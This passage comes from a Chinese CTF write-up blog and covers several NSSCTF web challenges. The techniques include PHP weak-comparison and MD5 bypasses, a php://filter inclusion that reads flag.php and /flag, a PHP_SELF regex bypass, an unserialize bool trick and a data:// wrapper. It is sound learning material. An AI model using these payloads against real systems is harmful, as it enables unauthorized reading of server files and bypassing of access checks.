–弱比较 –intval()</h2><p>&emsp;&emsp;进入环境得到PHP代码，审计关键代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># POST方式传入参数a，a中无数字，intval？？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]))</span><br><span class="line"><span class="comment"># POST方式传入参数b1、b2</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>])</span><br><span class="line"><span class="comment"># b1、b2进行MD5比较：数组绕过，具体原理见386</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b2&#x27;</span>]))</span><br><span class="line"><span class="comment"># POST方式传入参数c1、c2，必须为字符串，进行MD5弱比较</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c1&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c2&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;有一个不会的知识点，学一学</p><p>&emsp;&emsp;<code>int intval ( mixed $var [, int $base = 10 ] ) : int</code>，将输入转为整数值，返回转换后的整数值；如果转换失败，则返回 0</p><table><thead><tr><th align="center">参数</th><th align="center">类型</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center"><code>$var</code></td><td align="center">mixed</td><td align="center">要转换的变量。可以是整数、浮点数、字符串、布尔值、null、数组或对象。根据变量的类型，<code>intval</code> 会尝试将其转换为整数值。</td></tr><tr><td align="center"><code>$base</code></td><td align="center">int</td><td align="center">转换的进制，取值范围是2到36。默认值是10，当 <code>$var</code> 是字符串时，此参数指定了字符串的解析进制</td></tr></tbody></table><p>&emsp;&emsp;这下全知道了，要求一项项满足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 首先是a，随便给个数组绕过preg_match()就好</span><br><span class="line">a[]=1</span><br><span class="line"># b1，b2一样</span><br><span class="line">b1[]=123&amp;b2[]=1234</span><br><span class="line"># 由于c1，c2有限制，使用正常的&quot;0e&quot;法绕过，同样见386</span><br><span class="line">c1=MMHUWUV&amp;c2=MAUXXQC</span><br><span class="line"># 综上</span><br><span class="line">a[]=1&amp;b1[]=123&amp;b2[]=1234&amp;c1=MMHUWUV&amp;c2=MAUXXQC</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;OK，flag到手</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2076_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="2076_结果展示"></p><h2 id="2900-HNCTF-2022-Week1-Interesting-include-–文件包含漏洞-–PHP伪协议-–有问题尚未解决"><a href="#2900-HNCTF-2022-Week1-Interesting-include-–文件包含漏洞-–PHP伪协议-–有问题尚未解决" class="headerlink" title="2900_[HNCTF 2022 Week1]Interesting_include –文件包含漏洞 –PHP伪协议 –有问题尚未解决"></a>2900_[HNCTF 2022 Week1]Interesting_include –文件包含漏洞 –PHP伪协议 –有问题尚未解决</h2><p>&emsp;&emsp;进入环境得到PHP代码，这里的每一句话都在让我用<code>php://filter/</code>做事啊，不过还不是时候</p><p>&emsp;&emsp;由于正则表达式过滤了关键词flag，所以我们选择绕过关键词，使用单引号绕过，先尝试直接输入文件名</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2900_%E6%8A%A5%E9%94%99%E6%8F%90%E7%A4%BA.png" title="2900_报错提示"></p><p>&emsp;&emsp;不出所料不让用，这下老实用PHP伪协议了，先输个错的试试：<code>php://filter/read=convert.base64-encode/resource=flag.php</code></p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2900_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="2900_结果展示"></p><p>&emsp;&emsp;啊啊啊？不是拦截了flag关键字吗？怎么输了还能过？上网查了查，觉得应该是这回事</p><p>&emsp;&emsp;首先应该了解一下PHP伪协议的生效流程(下列讲述仅为个人结合题目特殊处、询问文心一言之后的初步理解，欢迎探讨、赐教)</p><table><thead><tr><th align="center">步骤</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><strong>参数接收</strong></td><td align="center">你的输入(例如，通过GET请求、POST请求或其他方式传递的参数)首先被PHP脚本接收</td></tr><tr><td align="center"><strong>解析参数</strong></td><td align="center">PHP脚本解析接收到的参数，并识别出它是一个特殊的流封装器URL(即 <code>php://filter/...</code>)</td></tr><tr><td align="center"><strong>流封装器处理</strong></td><td align="center">PHP的流封装器机制开始处理这个URL。<code>php://filter</code> 是一个特殊的流封装器，用于在读取或写入数据之前对数据进行过滤</td></tr><tr><td align="center"><strong>过滤器应用</strong></td><td align="center">根据URL中的 <code>read=convert.base64-encode</code> 部分，PHP应用Base64编码过滤器；在读取 <code>flag.php</code> 文件的内容之前，PHP会先将其内容转换为Base64编码</td></tr><tr><td align="center"><strong>资源访问</strong></td><td align="center">PHP尝试访问 <code>resource=flag.php</code> 指定的资源，通常意味着打开并读取该文件的内容</td></tr><tr><td align="center"><strong>返回结果</strong></td><td align="center">经过Base64编码后的文件内容被返回给调用者</td></tr><tr><td align="center"><strong>执行后续代码</strong></td><td align="center">在参数被接收和解析(以及可能的流封装器处理)之后，PHP脚本会继续执行后续的代码；这可能包括进一步处理解析后的参数、执行数据库查询、生成HTML输出等</td></tr></tbody></table><p>&emsp;&emsp;也就是说，在后续preg_match()还未作用时，资源访问的结果已经展示出来了</p><h2 id="463-鹤城杯-2021-EasyP-–文件包含漏洞-–-SERVER-REQUEST-URI-绕过-–-SERVER-REQUEST-SELF-绕过-–basename-利用"><a href="#463-鹤城杯-2021-EasyP-–文件包含漏洞-–-SERVER-REQUEST-URI-绕过-–-SERVER-REQUEST-SELF-绕过-–basename-利用" class="headerlink" title="463_[鹤城杯 2021]EasyP –文件包含漏洞 –$_SERVER[&#39;REQUEST_URI&#39;]绕过 –$_SERVER[&#39;REQUEST_SELF&#39;]绕过 –basename()利用"></a>463_[鹤城杯 2021]EasyP –文件包含漏洞 –<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>绕过 –<code>$_SERVER[&#39;REQUEST_SELF&#39;]</code>绕过 –basename()利用</h2><p>&emsp;&emsp;进入环境得到PHP代码，审计关键代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># POST方式传入参数guess</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]))</span><br><span class="line"><span class="comment"># 将传入的guess参数转为字符串</span></span><br><span class="line"><span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line"><span class="comment"># 如果guess变量等于secret变量，输出flag (？？？哪来的$secret)</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>)</span><br><span class="line"><span class="comment"># ？？？</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]))</span><br><span class="line"><span class="comment"># ？？？？？？</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))</span><br><span class="line"><span class="comment"># 如果参数show_source</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;不是很想细致学正则表达式，我选择文心一言</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/utils\.php\/*$/i      =&gt; 以utils.php结尾</span><br><span class="line">/show_source/          =&gt; 包含show_source</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;然后再细致学习一下<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>、<code>$_SERVER[&#39;PHP_SELF&#39;]</code>的具体含义</p><table><thead><tr><th align="center">参数</th><th align="center">具体含义</th></tr></thead><tbody><tr><td align="center"><code>$_SERVER[&#39;REQUEST_URI&#39;]</code></td><td align="center">客户端请求资源的完整URL路径信息，包括查询字符串</td></tr><tr><td align="center"><code>$_SERVER[&#39;PHP_SELF&#39;]</code></td><td align="center">当前执行的脚本文件名</td></tr></tbody></table><p>&emsp;&emsp;现在来重新理解一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 如果当前执行的脚本中含utils.php，则被拦截</span><br><span class="line">if (preg_match(&#x27;/utils\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;]))</span><br><span class="line"># 如果当前URL中出现show_source，则被拦截</span><br><span class="line">if (preg_match(&#x27;/show_source/&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))</span><br><span class="line"># 语法高亮显示当前PHP脚本文件的内容</span><br><span class="line">highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]))</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;可还是找不到绕过的思路，没办法，出去看了佬们的WriteUp，总结知识点如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># $_SERVER[&#x27;PHP_SELF&#x27;]参数返回的是除了域名/参数以外的URL，有如下例：</span><br><span class="line">http://127.0.0.1/try.php    =&gt; /try.php</span><br><span class="line">http://127.0.0.1/test/try.php    =&gt; /test/try.php</span><br><span class="line">http://127.0.0.1/test/test/try.php    =&gt; /test/test/try.php</span><br><span class="line">http://127.0.0.1/test/try.php?a=1&amp;b=1     =&gt; /test/try.php</span><br><span class="line">http://127.0.0.1/test/try1.php/try2.php     =&gt; /test/try1.php/try2.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># $_SERVER[&#x27;PHP_SELF&#x27;]参数返回的是除了域名以外的URL，有如下例：</span><br><span class="line">http://127.0.0.1/try.php    =&gt; /try.php</span><br><span class="line">http://127.0.0.1/test/try.php    =&gt; /test/try.php</span><br><span class="line">http://127.0.0.1/test/test/try.php    =&gt; /test/test/try.php</span><br><span class="line">http://127.0.0.1/test/try.php?a=1&amp;b=1     =&gt; /test/try.php?a=1&amp;b=1</span><br><span class="line">http://127.0.0.1/test/try1.php/try2.php     =&gt; /test/try1.php/try2.php</span><br><span class="line"># $_SERVER[&#x27;PHP_SELF&#x27;]不会自动将特殊字符转换，有如下例：</span><br><span class="line">http://127.0.0.1/test/try.php?a=1%20&amp;%20b=1     !=&gt; /test/try.php?a=1 &amp; b=1</span><br><span class="line">                                                 =&gt; /test/try.php?a=1%20&amp;%20b=1</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;接着是函数basename()</p><p>&emsp;&emsp;<code>string basename ( string $path [, string $suffix ] )</code>，返回路径中的文件名部分</p><table><thead><tr><th align="center">参数</th><th align="center">类型</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center"><code>$path</code></td><td align="center">string</td><td align="center">要处理的路径字符串，可以是相对路径或绝对路径</td></tr><tr><td align="center"><code>$suffix</code></td><td align="center">string</td><td align="center">如果指定这个参数，并且它出现在路径的末尾，那么这部分会被移除，即不显示</td></tr></tbody></table><p>&emsp;&emsp;且，由于$_SERVER[‘PHP_SELF’]参数读取顺序从后向前，遇到非ASCII码即截止，故利用此可绕过正则表达式的匹配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/utils\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])   =&gt; utils.php/陈：返回否，即无匹配字符串</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;故尝试构造payload绕过两次正则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 当前处于index.php脚本中，必需向index.php脚本中传入参数，故不能直接URL后加/utils.php，需先加index.php</span><br><span class="line">/index.php/utils.php/陈?show%5Fsource=1</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;OK，一次成功(看了答案不一次成功也说不过去吧☞☜)</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/463_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="463_结果展示"></p><h2 id="2602-HUBUCTF-2022-新生赛-checkin-–反序列化-–bool弱比较绕过"><a href="#2602-HUBUCTF-2022-新生赛-checkin-–反序列化-–bool弱比较绕过" class="headerlink" title="2602_[HUBUCTF 2022 新生赛]checkin –反序列化 –bool弱比较绕过"></a>2602_[HUBUCTF 2022 新生赛]checkin –反序列化 –bool弱比较绕过</h2><p>&emsp;&emsp;进入环境得到PHP代码，审计关键代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># info变量接受GET方式传入的参数，若无，则为空</span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="comment"># data_unserialize变量接受序列化字串info并储存反序列化结果</span></span><br><span class="line"><span class="variable">$data_unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;根据提示，需要的两个变量username和password显然不是代码中给出的两个值；info为两个变量(一个数组)的序列化字串，故只需要再解决未知参数比较为真的要求即可获取flag</p><p>&emsp;&emsp;注意到比较符为“&#x3D;&#x3D;”，即<strong>弱比较：先隐式转换变量类型，再比较其值</strong>，如果输入一个bool值，只要两变量不为空，即可匹配成功(当然要是为否导致匹配不成功，我们也可以从我们这边输入否嘛)；尝试编写.php文件输出序列化字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;username&quot;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span> =&gt; <span class="literal">true</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;将结果传入参数info即得到flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2602_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="2602_结果展示"></p><h2 id="3740-GDOUCTF-2023-EZ-WEB-–Flask-–HTTP请求方式修改"><a href="#3740-GDOUCTF-2023-EZ-WEB-–Flask-–HTTP请求方式修改" class="headerlink" title="3740_[GDOUCTF 2023]EZ WEB –Flask –HTTP请求方式修改"></a>3740_[GDOUCTF 2023]EZ WEB –Flask –HTTP请求方式修改</h2><p>&emsp;&emsp;进入环境，点按钮后没有东西。看看源代码，发现有个提示</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3740_%E6%BA%90%E7%A0%81%E6%8F%90%E7%A4%BA.png" title="3740_源码提示"></p><p>&emsp;&emsp;在URL后面添加<code>/src</code>得到Python代码，第一次遇见，详细分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"><span class="comment"># 将 URL+/ 的访问使用下面的函数执行，返回index.html</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">  <span class="keyword">return</span> flask.send_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"><span class="comment"># 将 URL+/src 的访问使用下面的函数执行，返回app.py</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">  <span class="keyword">return</span> flask.send_file(<span class="string">&#x27;app.py&#x27;</span>)</span><br><span class="line"><span class="comment"># 解题关键</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/super-secret-route-nobody-will-guess&#x27;</span>, methods=[<span class="string">&#x27;PUT&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;要求使用“PUT”请求访问路径<code>/super-secret-route-nobody-will-guess</code>，故选择BurpSuite抓包修改请求头，得到flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3740_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="3740_结果展示"></p><h2 id="2821-SWPUCTF-2022-新生赛-ez-ez-php-revenge-–PHP伪协议-–文件包含"><a href="#2821-SWPUCTF-2022-新生赛-ez-ez-php-revenge-–PHP伪协议-–文件包含" class="headerlink" title="2821_[SWPUCTF 2022 新生赛]ez_ez_php(revenge) –PHP伪协议 –文件包含"></a>2821_[SWPUCTF 2022 新生赛]ez_ez_php(revenge) –PHP伪协议 –文件包含</h2><p>&emsp;&emsp;进入环境得到PHP代码，审计关键代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以GET方式传入参数file</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// 要求file参数的前三个字符是php</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice!!!&quot;</span>;</span><br><span class="line">        <span class="comment">// 显示file参数所指文件</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这道题和2640一模一样，直接照搬答案：<code>php://filter/read=convert.base64-encode/resource=flag.php</code>，得到Base64编码如下，转换得到如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Base64：PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCmhlYWRlcigiQ29udGVudC1UeXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7DQoNCg0KZWNobyAgICJOU1NDVEZ7ZmxhZ19pc19ub3RfaGVyZX0iIC4iPGJyLz4iOw0KZWNobyAicmVhbF9mbGFnX2lzX2luXyAnL2ZsYWcnICIuIjxici8+IjsNCmVjaG8gIuaNouS4quaAnei3r++<span class="number">8</span>jOivleivlVBIUOS8quWNj+iuruWRoiI7DQo=</span><br><span class="line">转换后：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>   <span class="string">&quot;NSSCTF&#123;flag_is_not_here&#125;&quot;</span> .<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;real_flag_is_in_ &#x27;/flag&#x27; &quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;换个思路，试试PHP伪协议呢&quot;</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;再做一下，然后会发现<code>/flag</code>突然不行了，好嘛这次换一个：<code>php://filter/read=convert.base64-encode/resource=/flag</code>，转换得到flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2821_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="2821_结果展示"></p><h2 id="3700-GDOUCTF-2023-泄露的伪装-–目录扫描-–www-rar下载-–file-get-contents-绕过"><a href="#3700-GDOUCTF-2023-泄露的伪装-–目录扫描-–www-rar下载-–file-get-contents-绕过" class="headerlink" title="3700_[GDOUCTF 2023]泄露的伪装 –目录扫描 –www.rar下载 –file_get_contents()绕过"></a>3700_[GDOUCTF 2023]泄露的伪装 –目录扫描 –<a href="http://www.rar下载/">www.rar下载</a> –file_get_contents()绕过</h2><p>&emsp;&emsp;进入环境，除了一句话，啥也没有。F12、网页源码、Curl+V都不行，尝试目录扫描，结果同样不好</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3700_%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" title="3700_目录扫描结果"></p><p>&emsp;&emsp;上述情况的产生，说明我自己编写的尝试集合被URL全部屏蔽掉了，尝试使用更高级的目录扫描工具ヾ(´･ ･｀｡)ノ”</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3700_dirsearch%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" title="3700_dirsearch扫描结果"></p><p>&emsp;&emsp;观察到有一个<code>www.rar</code>的类似压缩包的路径，试一下是不是有东西下载，确实；打开压缩包中的唯一文件，发现下一步信息</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3700_%E4%B8%8B%E4%B8%80%E6%AD%A5%E4%BF%A1%E6%81%AF.png" title="3700_下一步信息"></p><p>&emsp;&emsp;打开发现PHP代码，审计关键代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以GET方式传参</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cxk</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>];</span><br><span class="line">    <span class="comment">// 魔术方法file_get_contents绕过</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$cxk</span>)==<span class="string">&quot;ctrl&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;file_get_contents函数在题441中有学到，直接使用<code>data://tetx/plain</code>PHP伪协议：<code>?cxk=data://tetx/plain,ctrl</code>，得到flag</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/3700_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="3700_结果展示"></p><h2 id="2898-HNCTF-2022-Week1-2048-–JS分析"><a href="#2898-HNCTF-2022-Week1-2048-–JS分析" class="headerlink" title="2898_[HNCTF 2022 Week1]2048 –JS分析"></a>2898_[HNCTF 2022 Week1]2048 –JS分析</h2><p>&emsp;&emsp;进入环境，熟悉的游戏界面，不犹豫，直接看网页源代码，观察发现还有一个JS文件，进入</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2898_%E5%8C%85%E5%90%ABJS%E6%96%87%E4%BB%B6.png" title="2898_包含JS文件"></p><p>&emsp;&emsp;发现其中的中文无法正确显示，本地下载后，使用Notepad++以UTF-8编码方式查看，在判断分数大于20000的True分支中找到线索</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2898_%E6%96%B0%E7%BA%BF%E7%B4%A2.png" title="2898_新线索"></p><p>&emsp;&emsp;F12，在console控制台输出alert语句的结果，得到flag，注意修改为“NSSCTF{}”形式</p><p><img src="/2024/11/23/NSSCTF-Web%E7%AC%94%E8%AE%B01-50/2898_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" title="2898_结果展示"></p><h2 